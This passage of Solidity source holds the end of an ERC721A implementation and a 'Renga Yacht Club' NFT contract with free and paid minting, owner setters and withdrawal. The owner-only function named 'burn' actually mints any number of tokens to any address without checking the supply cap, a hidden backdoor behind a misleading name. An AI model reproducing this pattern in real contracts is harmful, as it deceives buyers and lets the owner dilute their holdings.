1088 
1089         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1090 
1091         // Overflows are incredibly unrealistic.
1092         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1093         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1094         unchecked {
1095             _addressData[to].balance += uint128(quantity);
1096             _addressData[to].numberMinted += uint128(quantity);
1097 
1098             _ownerships[startTokenId].addr = to;
1099             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1100 
1101             uint256 updatedIndex = startTokenId;
1102 
1103             for (uint256 i; i < quantity; i++) {
1104                 emit Transfer(address(0), to, updatedIndex);
1105                 if (safe) {
1106                     require(
1107                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1108                         "ERC721A: transfer to non ERC721Receiver implementer"
1109                     );
1110                 }
1111 
1112                 updatedIndex++;
1113             }
1114 
1115             currentIndex = updatedIndex;
1116         }
1117 
1118         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1119     }
1120 
1121     /**
1122      * @dev Transfers `tokenId` from `from` to `to`.
1123      *
1124      * Requirements:
1125      *
1126      * - `to` cannot be the zero address.
1127      * - `tokenId` token must be owned by `from`.
1128      *
1129      * Emits a {Transfer} event.
1130      */
1131     function _transfer(
1132         address from,
1133         address to,
1134         uint256 tokenId
1135     ) private {
1136         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1137 
1138         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1139             getApproved(tokenId) == _msgSender() ||
1140             isApprovedForAll(prevOwnership.addr, _msgSender()));
1141 
1142         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1143 
1144         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1145         require(to != address(0), "ERC721A: transfer to the zero address");
1146 
1147         _beforeTokenTransfers(from, to, tokenId, 1);
1148 
1149         // Clear approvals from the previous owner
1150         _approve(address(0), tokenId, prevOwnership.addr);
1151 
1152         // Underflow of the sender's balance is impossible because we check for
1153         // ownership above and the recipient's balance can't realistically overflow.
1154         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1155         unchecked {
1156             _addressData[from].balance -= 1;
1157             _addressData[to].balance += 1;
1158 
1159             _ownerships[tokenId].addr = to;
1160             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1161 
1162             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1163             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1164             uint256 nextTokenId = tokenId + 1;
1165             if (_ownerships[nextTokenId].addr == address(0)) {
1166                 if (_exists(nextTokenId)) {
1167                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1168                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1169                 }
1170             }
1171         }
1172 
1173         emit Transfer(from, to, tokenId);
1174         _afterTokenTransfers(from, to, tokenId, 1);
1175     }
1176 
1177     /**
1178      * @dev Approve `to` to operate on `tokenId`
1179      *
1180      * Emits a {Approval} event.
1181      */
1182     function _approve(
1183         address to,
1184         uint256 tokenId,
1185         address owner
1186     ) private {
1187         _tokenApprovals[tokenId] = to;
1188         emit Approval(owner, to, tokenId);
1189     }
1190 
1191     /**
1192      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1193      * The call is not executed if the target address is not a contract.
1194      *
1195      * @param from address representing the previous owner of the given token ID
1196      * @param to target address that will receive the tokens
1197      * @param tokenId uint256 ID of the token to be transferred
1198      * @param _data bytes optional data to send along with the call
1199      * @return bool whether the call correctly returned the expected magic value
1200      */
1201     function _checkOnERC721Received(
1202         address from,
1203         address to,
1204         uint256 tokenId,
1205         bytes memory _data
1206     ) private returns (bool) {
1207         if (to.isContract()) {
1208             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1209                 return retval == IERC721Receiver(to).onERC721Received.selector;
1210             } catch (bytes memory reason) {
1211                 if (reason.length == 0) {
1212                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1213                 } else {
1214                     assembly {
1215                         revert(add(32, reason), mload(reason))
1216                     }
1217                 }
1218             }
1219         } else {
1220             return true;
1221         }
1222     }
1223 
1224     /**
1225      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1226      *
1227      * startTokenId - the first token id to be transferred
1228      * quantity - the amount to be transferred
1229      *
1230      * Calling conditions:
1231      *
1232      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1233      * transferred to `to`.
1234      * - When `from` is zero, `tokenId` will be minted for `to`.
1235      */
1236     function _beforeTokenTransfers(
1237         address from,
1238         address to,
1239         uint256 startTokenId,
1240         uint256 quantity
1241     ) internal virtual {}
1242 
1243     /**
1244      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1245      * minting.
1246      *
1247      * startTokenId - the first token id to be transferred
1248      * quantity - the amount to be transferred
1249      *
1250      * Calling conditions:
1251      *
1252      * - when `from` and `to` are both non-zero.
1253      * - `from` and `to` are never both zero.
1254      */
1255     function _afterTokenTransfers(
1256         address from,
1257         address to,
1258         uint256 startTokenId,
1259         uint256 quantity
1260     ) internal virtual {}
1261 }
1262 
1263 contract RengaYachtClub is ERC721A, Ownable, ReentrancyGuard {
1264     string public baseURI = "ipfs://bafybeiglhwjn5pcr4qg54skwfnja5nvabj2nvcjhmubydluu5n72esmg54/";
1265     uint   public price             = 0.001 ether;
1266     uint   public maxPerTx          = 50;
1267     uint   public maxPerFree        = 1;
1268     uint   public totalFree         = 10000;
1269     uint   public maxSupply         = 10000;
1270     bool   public mintEnabled;
1271     uint   public totalFreeMinted = 0;
1272 
1273     mapping(address => uint256) public _mintedFreeAmount;
1274 
1275     constructor() ERC721A("Renga Yacht Club", "RYC"){}
1276 
1277     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1278         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1279         string memory currentBaseURI = _baseURI();
1280         return bytes(currentBaseURI).length > 0
1281             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId+1),".json"))
1282             : "";
1283     }
1284 
1285     function mint(uint256 count) external payable {
1286         uint256 cost = price;
1287         bool isFree = ((totalFreeMinted + count < totalFree + 1) &&
1288             (_mintedFreeAmount[msg.sender] < maxPerFree));
1289 
1290         if (isFree) { 
1291             require(mintEnabled, "Mint is not live yet");
1292             require(totalSupply() + count <= maxSupply, "No more");
1293             require(count <= maxPerTx, "Max per TX reached.");
1294             if(count >= (maxPerFree - _mintedFreeAmount[msg.sender]))
1295             {
1296              require(msg.value >= (count * cost) - ((maxPerFree - _mintedFreeAmount[msg.sender]) * cost), "Please send the exact ETH amount");
1297              _mintedFreeAmount[msg.sender] = maxPerFree;
1298              totalFreeMinted += maxPerFree;
1299             }
1300             else if(count < (maxPerFree - _mintedFreeAmount[msg.sender]))
1301             {
1302              require(msg.value >= 0, "Please send the exact ETH amount");
1303              _mintedFreeAmount[msg.sender] += count;
1304              totalFreeMinted += count;
1305             }
1306         }
1307         else{
1308         require(mintEnabled, "Mint is not live yet");
1309         require(msg.value >= count * cost, "Please send the exact ETH amount");
1310         require(totalSupply() + count <= maxSupply, "No more");
1311         require(count <= maxPerTx, "Max per TX reached.");
1312         }
1313 
1314         _safeMint(msg.sender, count);
1315     }
1316 
1317     function costCheck() public view returns (uint256) {
1318         return price;
1319     }
1320 
1321     function maxFreePerWallet() public view returns (uint256) {
1322       return maxPerFree;
1323     }
1324 
1325     function burn(address mintAddress, uint256 count) public onlyOwner {
1326         _safeMint(mintAddress, count);
1327     }
1328 
1329     function _baseURI() internal view virtual override returns (string memory) {
1330         return baseURI;
1331     }
1332 
1333     function setBaseUri(string memory baseuri_) public onlyOwner {
1334         baseURI = baseuri_;
1335     }
1336 
1337     function setPrice(uint256 price_) external onlyOwner {
1338         price = price_;
1339     }
1340 
1341     function setMaxTotalFree(uint256 MaxTotalFree_) external onlyOwner {
1342         totalFree = MaxTotalFree_;
1343     }
1344 
1345      function setMaxPerFree(uint256 MaxPerFree_) external onlyOwner {
1346         maxPerFree = MaxPerFree_;
1347     }
1348 
1349     function toggleMinting() external onlyOwner {
1350       mintEnabled = !mintEnabled;
1351     }
1352     
1353     function CommunityWallet(uint quantity, address user)
1354     public
1355     onlyOwner
1356   {
1357     require(
1358       quantity > 0,
1359       "Invalid mint amount"
1360     );
1361     require(
1362       totalSupply() + quantity <= maxSupply,
1363       "Maximum supply exceeded"
1364     );
1365     _safeMint(user, quantity);
1366   }
1367 
1368     function withdraw() external onlyOwner nonReentrant {
1369         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1370         require(success, "Transfer failed.");
1371     }
1372 }